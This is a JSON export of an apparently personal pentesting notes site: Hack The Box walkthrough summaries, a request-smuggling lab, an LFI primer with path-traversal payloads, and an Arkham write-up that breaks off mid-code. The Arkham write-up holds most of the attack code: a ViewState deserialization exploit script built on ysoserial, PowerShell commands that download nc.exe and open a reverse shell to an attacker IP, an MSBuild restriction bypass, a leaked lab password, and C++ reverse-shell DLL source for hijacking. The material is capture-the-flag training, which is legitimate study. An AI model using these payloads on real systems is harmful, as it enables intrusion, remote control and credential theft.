[
{
	"uri": "/hackthebox/boxes/",
	"title": "Boxes",
	"tags": [],
	"description": "",
	"content": "Boxes\n```   FTP FILE TRANSFER PROTOCOL SSH secure shell HTTP and an unknown port protected H2 database on 8082 GOBUSTER\n  Arkhams \n  Bastions \n  Blue Blue Special thanks to IppSec for contributing to this post. Please Subscribe changes /etc/hosts so 10.10.10.40 blue.htb PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP) 49152/tcp open msrpc Microsoft Windows RPC 49153/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC 49155/tcp open msrpc Microsoft Windows RPC 49156/tcp open msrpc Microsoft Windows RPC 49157/tcp open msrpc Microsoft Windows RPC Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed.\n  CHAOS chaos web server is hosting quite a few webpages. 10.10.10.120/wp/wordpress, chaos.htb, webmail.chaos.htb, chaos.htb:10000. Using wfuzz we find the subdomain. THERE IS A WAF INPLACE BLOCK ACCESSIVE LOGIN ETC NMAP not sure what 10000 really is most likely related nmap -sC -sV -oA nmap/initial chaos.htb -T4 Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-06 09:30 EST Nmap scan report for chaos.htb (10.10.10.120) Host is up (0.046s latency). Not shown: 994 closed ports PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.\n  CTF The biggest take away would be I recently participated in a ctf, it was different than htb. more about finding a bunch of hidden flags all over the file system. in various places. There were 9 host and over 25 flags. This was a fun new kind of a ctf. =].DONT OVERESTIMATE THE CTF. WebServer: It had a lot of ports open an I was quick to rush in and wasted a bit of time that couldn\u0026rsquo;t have been prevented.\n  Carrier TCP Nmap 7.70 scan initiated Sat Dec 22 18:11:46 2018 as: nmap -sC -sV -oA carrier-total -T5 -p- 10.10.10.105 Nmap scan report for carrier.htb (10.10.10.105) Host is up (0.14s latency). Not shown: 65532 closed ports PORT STATE SERVICE VERSION 21/tcp filtered ftp 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 15:a4:28:77:ee:13:07:06:34:09:86:fd:6f:cc:4c:e2 (RSA) | 256 37:be:de:07:0f:10:bb:2b:b5:85:f7:9d:92:5e:83:25 (ECDSA) |_ 256 89:5a:ee:1c:22:02:d2:13:40:f2:45:2e:70:45:b0:c4 (ED25519) 80/tcp open http Apache httpd 2.\n  CarrierRoot This guide will only cover setting up BGP high jacking and to better summarize how to set up a MITM using BGP. There is one method that I believe everyone used which is where you host an FTP server and just redirect the traffic to our ftp server. Not quite as cool as mitm. https://www.youtube.com/watch?v=2ZxRA8BgmnA https://0xdf.gitlab.io/2019/03/16/htb-carrier.html#bgp-hijack There\u0026rsquo;s a script running in the background that will reset all the changes made. I had to deal with this the whole time I did the lab.\n  CrimeStopper watch the ippsec video https://www.youtube.com/watch?v=bgKth1K44QA read this guide :https://0xdf.gitlab.io/2018/06/03/htb-crimestoppers.html This is just a summary of those two guides. Initial scan only shows port 80 open. + FSociety ransomware all the major credit databases and destroyed the backups. wfuzz -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -u http://crimestoppers.htb/?op=FUZZ Navigating to list we get a list of submitted tips. A note from white rose. https://addons.mozilla.org/en-US/firefox/addon/cookie-quick-manager/ So null, byte doesn\u0026rsquo;t work and encoding the string doesn\u0026rsquo;t work.\n  Devel nmap -sT -p- -Pn -T5 nmap/initial 10.10.10.5 Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-23 14:57 EST Unable to split netmask from target expression: \u0026quot;nmap/initial\u0026quot; Nmap scan report for 10.10.10.5 Host is up (0.044s latency). Not shown: 65533 filtered ports PORT STATE SERVICE 21/tcp open ftp 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 75.84 seconds nmap -sV -sC -p21,80 nmap/http-ftp 10.10.10.5 Starting Nmap 7.\n  Ethereal there is allot going on with this box first we go to ftp but we can only interact with it using some other methods. used wget to download the drive. inside the drives we find pbox then use that to get some creds. go back to the website enter creds. play around with the waf to run cmd\u0026rsquo;s. then have to write a python script to get a shell. it just keeps going.\n  Flujab Thank you to 0xdf and ippsec for their guides. Postmortem This will not be the typical guide. I will be covering highlights. Changeing /etc/hosts didn\u0026rsquo;t notice any change then i went to 0xdf notes. saw that openssl was used to get a list of of fqdmn. I thought it would be neat to use the same trick use din sizzle to get the certs. exporting the cert didn\u0026rsquo;t not yield the (field values).\n  FriendZone Not shown: 993 closed ports [326/1271] PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: |_ 256 00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b (ED25519) 53/tcp open domain ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux) | dns-nsid: |_ bind.version: 9.11.3-1ubuntu1.2-Ubuntu 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Friend Zone Escape software 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 443/tcp open ssl/http Apache httpd 2.\n  GrandMa Started out with nmap moved into enumeration with gobuster to enum web directories. Nmap ![gobuster](https://chickenpwny.github.io/images/grandma/gobuster.PNG)nmap -sV -sC -T5 -p80 -oA total-first 10.10.10.15 Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-30 20:05 EDT Nmap scan report for 10.10.10.15 Host is up (0.12s latency). PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 6.0 | http-methods: |_ Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT |_http-server-header: Microsoft-IIS/6.\n  Helplines \n  Legacy NMAP nmap -sC -sV -p 139,445 -oA nmap/scripts 10.10.10.4 Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-22 19:37 EST Nmap scan report for 10.10.10.4 Host is up (0.042s latency). PORT STATE SERVICE VERSION 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows XP microsoft-ds Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp Host script results: |_clock-skew: mean: -4h05m13s, deviation: 1h24m51s, median: -5h05m13s |_nbstat: NetBIOS name: LEGACY, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: 00:50:56:a4:5d:23 (VMware) | smb-os-discovery: | OS: Windows XP (Windows 2000 LAN Manager) | OS CPE: cpe:/o:microsoft:windows_xp::- | Computer name: legacy | NetBIOS computer name: LEGACY\\x00 | Workgroup: HTB\\x00 |_ System time: 2019-02-22T23:32:00+02:00 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) |_smb2-time: Protocol negotiation failed (SMB2) Service detection performed.\n  LightWeight Lightweight has some kind of waf in place that\u0026rsquo;s prevents brute forcing of any kind. It creates a user based on your IP address. that will grant us access. once somebody visits the website it creates a username \u0026amp; password based on that person IP address, creepy. initially you will need to change your hosts file lightweight.htb ssh ippaddr@lightweight.htb password = ipaddress passwd to change password once logged in. Linux version 3.\n  Mischief THIS IS A SUMMARY OF IPPSEC VIDEO \u0026amp; 0XDF GUIDE. watch the ippsec video https://www.youtube.com/watch?v=GKo6xoB1g4Q read this guide https://0xdf.gitlab.io/2019/01/05/htb-mischief.html Summary, this box highlights securing ipv6. I would like to note the ipv6 address changes every reset so careful copy pasting. The quality of the phpsession tokens is exellent damnit. Nmap -v print output as it find it -max-retries 0 \u0026lt;\u0026ndash; save for later # Nmap 7.70 scan initiated Tue Jan 1 16:00:09 2019 as: nmap -sV -sC -p- -Pn -oA total -T5 10.\n  Network Manager Down Network Icon Disappeared\n  Network Manager Down Network Icon Disappeared\n  Optimum NMAP nmap -sV -sC 10.10.10.8 Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-25 00:19 EST Nmap scan report for 10.10.10.8 Host is up (0.042s latency). Not shown: 999 filtered ports PORT STATE SERVICE VERSION 80/tcp open http HttpFileServer httpd 2.3 |_http-server-header: HFS 2.3 |_http-title: HFS / Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 14.\n  Poison PHASE 1 NMAP nmap -sC -sV -Pn -oA initial_poison 10.10.10.84 port 22 ssh it can be a rabbit-hole. port 80 webpage apache 2.4.29 (FreeBSD) PHP/ 5.6.32 port 514 hmm PHASE 2 LFI Manually inspect the webpage this is kind of tedious. As you’ll have to investigate the PHP scripts one by one. listfiles.php has an interesting new piece of information. Go back to the default webpage and enter PWDBACKUP.TXT.\n  SecNotes NMAP PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 | http-title: Secure Notes - Login |Requested resource was login.php 445/tcp open microsoft-ds Windows 10 Enterprise 17134 microsoft-ds (workgroup: HTB) 8808/tcp open http Microsoft IIS httpd 10.0 |-methods: | Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 |_http-title: IIS Windows Service Info: Host: SECNOTES; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 2h32m44s, deviation: 4h37m10s, median: -7m17s\n  Sense Sense, well be attacking pfsense 2.14 which has a couple of vulnerabilities, pfsense will block you for 24 hours if it detects brute forcing or 15 failed login attempts. To get around this ippsec tunnel through another machine enumerated that way. Using a web directory fuzzer will find two text files that offer some clues to the cmd injection exploit, and the username. I suppose were suppose to guess the password is still pfsense when the username is changed but oh well.\n  Sizzle NMAP # Nmap 7.70 scan initiated Fri Feb 15 14:24:35 2019 as: nmap -T4 -sC -sV -oA nmap/initial 10.10.10.103 Nmap scan report for 10.10.10.103 Host is up (0.050s latency). Not shown: 987 filtered ports PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd |_ftp-anon: Anonymous FTP login allowed (FTP code 230) | ftp-syst: |_ SYST: Windows_NT 53/tcp open domain? | fingerprint-strings: | DNSVersionBindreqTCP: | version |_ bind 80/tcp open http Microsoft IIS httpd 10.\n  Sizzle-Gold Nmap 80/tcp open http Microsoft IIS httpd 10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 |_http-title: Site doesn't have a title (text/html). 445/tcp open microsoft-ds? 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 5986/tcp open ssl/http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found | ssl-cert: Subject: commonName=sizzle.HTB.LOCAL | Subject Alternative Name: othername:\u0026lt;unsupported\u0026gt;, DNS:sizzle.HTB.LOCAL | Not valid before: 2019-06-03T11:45:21 |_Not valid after: 2020-06-02T11:45:21 |_ssl-date: 2019-06-03T15:07:26+00:00; -6m04s from scanner time.\n  Sneaky The goal of this guide since ill be using other guides to solve it will be to learn as much as possible. There are two open ports, 80 \u0026amp; 161 on udp snmp. The webpage is under development, with a web directory that hides some content. nmap -sT -Pn -T5 -oA nmap/initial 10.10.10.60 -sT full tcp connection three way handshake -Pn treat ports as if they are open -T5 super speed ### 80 ### nmap -sU --top-port 1000 -oA nmap/udp 10.\n  Valentine I lost my original notes. VM corrupted. PHASE 1 — NMAP nmap -sC -sV -Pn -oA initial 10.10.10.79 Didn’t return anything of significance. https is odd for a hackthebox challenge. Port 22 could be the initial foothold. Google apache 2.2.22 https vulns nothing crazy pops out. PHASE 2 — GOBUSTER /wpscan gobuster -u [http://10.10.10.](http://10.10.10.88)79 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-mediuml.txt -t 50 return vulnerable to OpenSSL hearbleed PHASE 3 Manual investigation of the webpage\n  Vault Vault Nmap showed some ephemeral ports, ssh, HTTP. Gobuster didn’t initially show anything. Tried wfuzz to check for possible subdomains nothing. moving on to the webpage slowdaddy webpage haaha. talks about how the webpage is under construction in the first client is sparklays. which is a real jewelry company. Gobuster was tricky append sparklays to url, and use txt,html,php extentions. I used the seclist to find the directory. so it turns out its not sql injections pretty happy with that.\n  Waldo WALDO Instead of giving binaries system-wide permissions, give them the permissions they need to do the job. Skipping past Nmap, after messing around with the request’s found three request fileWrite, dirRead, fileRead. FileWrite writes user-supplied input to list1. dirRead will enumerate directories and print out the content. fileRead needs the exact file path to work. Sqlmap, Wfuzz didn’t work I had more success with wfuzz but I couldn’t filter the output.\n  Zipper NMAP initial # Nmap 7.70 scan initiated Fri Feb 15 14:32:38 2019 as: nmap -sC -sV -oA nmap/intial -T4 10.10.10.108 Nmap scan report for 10.10.10.108 Host is up (0.046s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 59:20:a3:a0:98:f2:a7:14:1e:08:e0:9b:81:72:99:0e (RSA) | 256 aa:fe:25:f8:21:24:7c:fc:b5:4b:5f:05:24:69:4c:76 (ECDSA) |_ 256 89:28:37:e2:b6:cc:d5:80:38:1f:b2:6a:3a:c3:a1:84 (ED25519) 80/tcp open http Apache httpd 2.\n  oz {{ button href=\u0026ldquo;https://www.youtube.com/watch?v=yX00n1UmalE\u0026quot; theme=danger }} IppSec {{ /button }} NMAP two ports 80 \u0026amp; 8080 nmap -sC -sV -oA nmap/oz-initial 10.10.10.96 -T4 Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-20 11:18 EST Stats: 0:00:12 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan Service scan Timing: About 0.00% done Nmap scan report for 10.10.10.96 Host is up (0.041s latency). Not shown: 998 filtered ports PORT STATE SERVICE VERSION 80/tcp open http Werkzeug httpd 0.\n  sunday INCOMPLETE sunos 5.111 2008, SunSsh FINGER USER LIST finger user@10.10.10.76 -s displays the user login real terminal write status no access is a least priviliege user -l same as -s but with directory information -p limits -l output stuff this box requires equine wordlist you can’t use the standard one. Metasploit module, be sure to change the dictionary used to enumerate the user list. Sammy Sunny HASHCAT I don’t remember where I found the hashes, i digress.\n  teacher nmap -sT -T3 -PS80,443,8000,8443,8800 -p 80,443,8000,8443,8080 -oA http-enum-results \u0026ndash;script=http-enum teacher.htb Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-24 16:27 EST Nmap scan report for teacher.htb (10.10.10.153) Host is up (0.043s latency). PORT STATE SERVICE 80/tcp open http | http-enum: | /css/: Potentially interesting directory w/ listing on \u0026lsquo;apache/2.4.25 (debian)\u0026rsquo; | /images/: Potentially interesting directory w/ listing on \u0026lsquo;apache/2.4.25 (debian)\u0026rsquo; | /js/: Potentially interesting directory w/ listing on \u0026lsquo;apache/2.4.25 (debian)\u0026rsquo; |_ /manual/: Potentially interesting folder\n  ```\n"
},
{
	"uri": "/hackthebox/boxes/hawk/",
	"title": "",
	"tags": [],
	"description": "",
	"content": "FTP FILE TRANSFER PROTOCOL\nSSH secure shell\nHTTP\nand an unknown port protected\nH2 database on 8082\nGOBUSTER\n"
},
{
	"uri": "/hackthebox/challenges/bloodhound/",
	"title": "",
	"tags": [],
	"description": "",
	"content": ""
},
{
	"uri": "/webapp/exploiting/",
	"title": "",
	"tags": [],
	"description": "",
	"content": "So I\u0026rsquo;m going to try and do a better job here than the first one. Here we will cover attacking the different web applications. First will explore bypassing user authenication by the front end. the back end will assume all request are valid. this is fix in version two of HTTP.\nby submitting this request twice. were able to get\nPOST / HTTP/1.1 Host: ac1d1f671e4a193c810c2562008000fd.web-security-academy.net User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close Cookie: session=XTs3cLFYYGhiz1y9XSPM9LvwNGLDsIYp Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded Content-Length: 114 Transfer-Encoding: chunked 0 GET /admin HTTP/1.1 Host: vulnerable-website.com Foo: xGET /home HTTP/1.1 Host: vulnerable-website.com  this as a response.\nHTTP/1.1 403 Forbidden Content-Type: application/json; charset=utf-8 X-Content-Type-Options: nosniff Connection: close Content-Length: 61 {\u0026quot;error\u0026quot;:\u0026quot;Forbidden: Duplicate header names are not allowed\u0026quot;}  it was at this moment i realised i need to look at the solution. because this is kind of what i\u0026rsquo;ve been dealing with.\nBy using this request were able to bypass user controls. it takes the next request as a parameter. o\nPOST / HTTP/1.1 Host: ac1d1f671e4a193c810c2562008000fd.web-security-academy.net User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close Cookie: session=XTs3cLFYYGhiz1y9XSPM9LvwNGLDsIYp Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded Content-Length: 120 Transfer-Encoding: chunked 0 GET /admin HTTP/1.1 Host: localhost Content-Type: application/x-www-form-urlencoded Content-Length: 10 x=  Next Phase play around with it chaning small details can break everything pretty neat.\nPOST / HTTP/1.1 Host: ac1d1f671e4a193c810c2562008000fd.web-security-academy.net User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close Cookie: session=XTs3cLFYYGhiz1y9XSPM9LvwNGLDsIYp Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded Content-Length: 143 Transfer-Encoding: chunked 0 GET /admin/delete?username=carlos HTTP/1.1 Host: localhost Content-Type: application/x-www-form-urlencoded Content-Length: 10 x=  The above web-request\n"
},
{
	"uri": "/",
	"title": "",
	"tags": [],
	"description": "",
	"content": "PLEASE CONTACT ME ON TWITTER OR BY EMAIL AT CHICKENPWNY IF ANY OF THE CONTENT VIOLATES HACKTHEBOX EULA.\nWelcome, to my repository of knowledge, HACKTHEBOXon walkthroughs, pentesting tools \u0026amp; concepts. The top right you will find social links. to the left or top, you should see navigation depends on the platform.\n"
},
{
	"uri": "/concepts/webapppentest/lfi/",
	"title": " Local File inclusion",
	"tags": [],
	"description": "",
	"content": "Local file inclusion this vulnerability occurs when system commands or unsanitized user input or written into how the web server handles user input. Basically, you escape out of the current string and your commands get executed. This only grants you the access the web app has. So if the PHP script has permissions for www-data which is a web server user. You won\u0026rsquo;t be able to access anything with elevated permissions. Before you start thinking PHP is the bad guy I want to go ahead and say all of the webpage languages are vulnerable.\nWord list for lfi can be found in seclist: /Seclist/Fuzzing/LFI-JHADDIX.txt\n\u0026hellip;.//\u0026hellip;.//\u0026hellip;.//etc/passwd\n/../../etc/passwd\n/..../..../..../..../..../..../etc/passwd\n/\u0026hellip;/\u0026hellip;/\u0026hellip;/\u0026hellip;/\u0026hellip;/etc/passwd\n\\…..\\\\…..\\\\…..\\\\etc\\passwd\n Often there will be filters in place, and then the job becomes understanding how the information is being filtered. If you\u0026rsquo;d like to see how PHP script in waldo handled user input read the WALDO write-up. You can also use burp to test for LFI I would recommend it makes it really convenient to test. in POISON there weren\u0026rsquo;t any filters in place so the standard escaped worked. (examples later) The web form allowed you to read local files. RCE :\nSadly LFI can\u0026rsquo;t upload files so if you want to get a reverse shell you will need the ability to upload binaries. FTP, Upload forums, you can execute the file by going to uploaded binary to execute it to get access.\n "
},
{
	"uri": "/hackthebox/boxes/arkham/writeup/",
	"title": "ARKHAM-writeup",
	"tags": [],
	"description": "",
	"content": "Arkham we begin our journey with with the webpage on port 8080. the website use apache my faces or java server faces. Login intot he smbshares as guest then find encryption secret inside a LUKS (llinux unified key setup) . we\u0026rsquo;ll write a python script to construct our own malicious Myfaces payload. Get a shell as alfred and have to read a outlook email(hard if you don\u0026rsquo;t own outlook lol). We get batmans password and login via winrm. Then escalate to Adminsitrator high jacking a dll.\nI ran a bunch of nmap scans in the raw notes.\nnmap -oA nmap/tcp-connect 10.10.10.130 Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-25 12:31 EDT Nmap scan report for 10.10.10.130 Host is up (0.044s latency). Not shown: 995 filtered ports PORT STATE SERVICE 80/tcp open http 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds 8080/tcp open http  So theres a share called Batshare with a file call appserver.zip.\nsmbmap -u guest -H 10.10.10.130 -r [+] Finding open SMB ports.... [+] User SMB session establishd on 10.10.10.130... [+] IP: 10.10.10.130:445 Name: 10.10.10.130 Disk Permissions ---- ----------- ADMIN$ NO ACCESS BatShare READ ONLY ./ dr--r--r-- 0 Sun Feb 3 08:04:13 2019 . dr--r--r-- 0 Sun Feb 3 08:04:13 2019 .. fr--r--r-- 4046695 Sun Feb 3 08:04:13 2019 appserver.zip  Run smbclient, since guest is default you dont need to list the user. When prompted for the password, HIT ENTER.\nsmbclient //10.10.10.130/BateShare mget appserver.zip  HASHCAT\nThe backup image is envrypted using luk which is a linux disk encryptino.\nhashcat -m 14600 -a 0 -w 3 hashes\\backup.img rockyou.txt -o found  LUKS Linux Unified Key Setup\nis a disk encryption, created by Fruhwirth in 2004, was originally intended for linux. Well be trying to decrypt the LUKS encrypted volume. Well use the cryptsetup tool to decrypt the volume. i know i did it a different way some how but i didn\u0026rsquo;t record it. lame.\nfile backup.img cryptsetup open --type luks backup.img batman ls -l /dev/mapper/ mkdir /mnt/arkham mount /dev/mapper/batman /mnt/batman  We\u0026rsquo;ll notice that there are some images and some tomcat stuff and a batman begins screen play. This will give us the encryption algoryth need for the myfaces. using grep to find the file need web.xml.bak, this tells us the secret used to encrypt the myfaces. mauahahahahaha. SnNGOTg3Ni0 is a base64 encoded string.\nSnNGOTg3Ni0= JsF9876- HmacSHA1  \u0026lt;param-name\u0026gt;org.apache.myfaces.SECRET\u0026lt;/param-name\u0026gt; \u0026lt;param-value\u0026gt;SnNGOTg3Ni0=\u0026lt;/param-value\u0026gt; \u0026lt;/context-param\u0026gt; \u0026lt;context-param\u0026gt; \u0026lt;param-name\u0026gt;org.apache.myfaces.MAC_ALGORITHM\u0026lt;/param-name\u0026gt; \u0026lt;param-value\u0026gt;HmacSHA1\u0026lt;/param-value\u0026gt; \u0026lt;/context-param\u0026gt; \u0026lt;context-param\u0026gt; \u0026lt;param-name\u0026gt;org.apache.myfaces.MAC_SECRET\u0026lt;/pavram-name\u0026gt; \u0026lt;param-value\u0026gt;SnNGOTg3Ni0=\u0026lt;/param-value\u0026gt; \u0026lt;/context-param\u0026gt;  PHASE2\nNow that we have all the intell we need to take advantage of the apache myfaces. we\u0026rsquo;ll take a look at the webapp now and start poking around. there are two webpage 80 then 8080. Navigate to 8080 then go to subscriptions. well be attacking the subscription page. I took the the viewstate and used cyberchief to decode then decrypt the string.\nviewstate is encrypted \u0026amp; encoded on top of that it has a hash it uses to verify it hasn\u0026rsquo;t been changed. the cipher used is single des by default( DEFAULT). Then a hash is taken of the encrypted string. All of that is bundled by encoding everything in base64. So to decrypt everything used python module crypto \u0026amp; some other modules but they are pretty common i suppose. i had some trouble getting everything right so i used allot of prints to get the right, output. for more example at the test script go to my notes.\nthe hmac takes up 20 bytes at the end. Ysoserial encryption type or whatever CommonsCollections5\ni made a bunch of methods that i call at the end to assemble it int he order i want.\nfrom Crypto.Cipher import DES from Crypto.Hash import HMAC, SHA1 import base64 import subprocess import urllib #variables# command = raw_input('Command: ') ysoserial = b'java -jar /opt/ysoserial/ysoserial.jar CommonsCollections5 \\'' + command + '\\'' payload = subprocess.check_output(ysoserial, stderr=subprocess.STDOUT, shell=True) ###methods##### def encrypt_vs(data): key = 'JsF9876-' mode = DES.MODE_ECB cipher = DES.new(key,mode) pad = (8 - (len(data) % 8)) % 8 padded = data + (chr(pad)*pad).encode() return cipher.encrypt(padded) def hmac_vs(data): key = 'JsF9876-' mode = digestmod=SHA1 h = HMAC.new(key, data, mode) return h.digest() ######### ippsec = encrypt_vs(payload) ippsmac = (hmac_vs(ippsec)) raw = ippsec + ippsmac encoded = (raw).encode(\u0026quot;base64\u0026quot;).replace('\\n','') pleasesubscribe = (urllib.quote_plus(encoded)) print (pleasesubscribe)  Shell\n​ Since it seem like there are some limitation most likely i can\u0026rsquo;t run new-object. well use invoke web-request to write out payload to disk then run a second command to get our shell, payload of choice is nc.exe.\npowershell -c iwr 'http://10.10.14.2/nc.exe' -outfile c:\\windows\\system32\\spool\\drivers\\color\\nc.exe -c command switch if you want cmd /c c:\\windows\\system32\\spool\\drivers\\color\\nc.exe -e cmd.exe 10.10.14.2 9913*  CLM\n$ExecutionContext.SessionState.LanguageMode  CLUES.BAK\nThis part will have a couple of steps firstly setting up a tunnel to arkhams, localhost and gaining access to 5985. my notes say i was able to get alfreds creds to work. i remember seeing it alfred in my winrm directory. i digres, Notice the timestamps in alfreds directory. the ones changes between 8:48 to 9:33am are the newest and most interesting. Downloads has a backup folder with owur prize backup.zip. we could use nc to move it over, smbserver.py and copy and paste via certutil.\ncertutil -encode backup.zip backup.b64 type backup.b64 use tmux set the buffer to 15k, then copy and paste.  some other ideas on how to move the file are below but did NOT work.\nInvoke-WebRequest -Uri http://10.10.14.2 -Proxy 'http://10.10.14.2:80' -Method Post -InFile backup.zip copy backup.zip //10.10.14.2/share  nc -lvnp 80 \u0026gt; backup.zip  im broke and i dont have allot of the windows office crap. i was able to find a tool called pstwalker they constantly bug you for money prolly infected my system.\n\u0026rdquo; This was pretty tough to find the right tool to open the outlook file. pstwalker it will try and get you to pay for stuff but thats not needed with a little tinkering i was able to get the message. \u0026ldquo;\nMoving the file off of -the host is pretty tricky could move it to the smb share. could move it with nc.exe,\nBATMAN\nUsername: Batman Password: Zx^#QZX+T!123\u0026rsquo;\nCHISEL\nas alfred setup chisel tunneling to 5985 on the localhost download chisel here chiselxamd64.exe, download this as well the run go go build. i renamed the binary chisel-server.\n./chisel-server server -p 9020 --reverse -v .\\c.exe client 10.10.14.2:9020 R:5985:127.0.0.1:5985  were foolishly given access to msbuild which is use to compile binaries mauahahahahahahahahah. well use this to bypass all the crap in our way and move on to victory.\ncsproj download https://github.com/Cn33liz/MSBuildShell\nBypassing AV CLM or UAC\u0026rsquo;s user account controls. super lame booo i think applockers in there to grouppolicy. I used\n@minatotw_ .csproj file sinces its like one of the ones i could find to bypass everything. i end up using a nishang Invoke-tcp.ps1 then pivoting and getting a meterpreter shell so i can gain access to the gui\u0026rsquo;s\niwr \u0026quot;http://10.10.14.2/minato.csproj\u0026quot; -outfile .\\pinkie.csproj c:\\windows\\microsoft.NET\\Framework64\\v4.0.30319\\msbuild.exe .\\pinkie.csproj  setup netcat and check and make sure python http server is running.\nAssembling the DLL\nThere are there parts to a dll when it comes to compiling them dllmain.cpp the payload revshell.cpp and a header file rev_shell.h. i tried compiling this in visual studios, i also tried the msfvenom build dlls. Defender Laughs.\ndllmain.cpp I tried awhole host of different dllmains this is the one i got to work. it calls in the header section revshell.h, DLL_PROCESS cal the revshell and assembles our payload.\n#include \u0026quot;rev_shell.h\u0026quot; #include \u0026lt;windows.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD fwdReason, LPVOID lpReservered) { switch (fwdReason) { case DLL_PROCESS_ATTACH: rev_shell(); case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; } return TRUE; }  revshell.cpp CHANGE THE REMOTE_PORT AND REMOTE_ADDR\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;process.h\u0026gt; #include \u0026lt;winsock2.h\u0026gt; #include \u0026lt;ws2tcpip.h\u0026gt; #pragma comment(lib, \u0026quot;Ws2_32.lib\u0026quot;) #define REMOTE_ADDR \u0026quot;10.10.14.2\u0026quot; #define REMOTE_PORT \u0026quot;9135\u0026quot; void rev_shell() { FreeConsole(); WSADATA wsaData; int iResult = WSAStartup(MAKEWORD(2, 2), \u0026amp;wsaData); struct addrinfo *result = NULL, *ptr = NULL, hints; memset(\u0026amp;hints, 0, sizeof(hints)); hints.ai_family = AF_UNSPEC; hints.ai_socktype = SOCK_STREAM; hints.ai_protocol = IPPROTO_TCP; getaddrinfo(REMOTE_ADDR, REMOTE_PORT, \u0026amp;hints, \u0026amp;result); ptr = result; SOCKET ConnectSocket = WSASocket(ptr-\u0026gt;ai_family, ptr-\u0026gt;ai_socktype, ptr-\u0026gt;ai_protocol, NULL, NULL, NULL); connect(ConnectSocket, ptr-\u0026gt;ai_addr, (int)ptr-\u0026gt;ai_addrlen); STARTUPINFO si; PROCESS_INFORMATION pi; ZeroMemory(\u0026amp;si, sizeof(si)); si.cb = sizeof(si); ZeroMemory(\u0026amp;pi, sizeof(pi)); si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE; si.hStdInput = (HANDLE)ConnectSocket; si.hStdOutput = (HANDLE)ConnectSocket; si.hStdError = (HANDLE)ConnectSocket; TCHAR cmd[] = 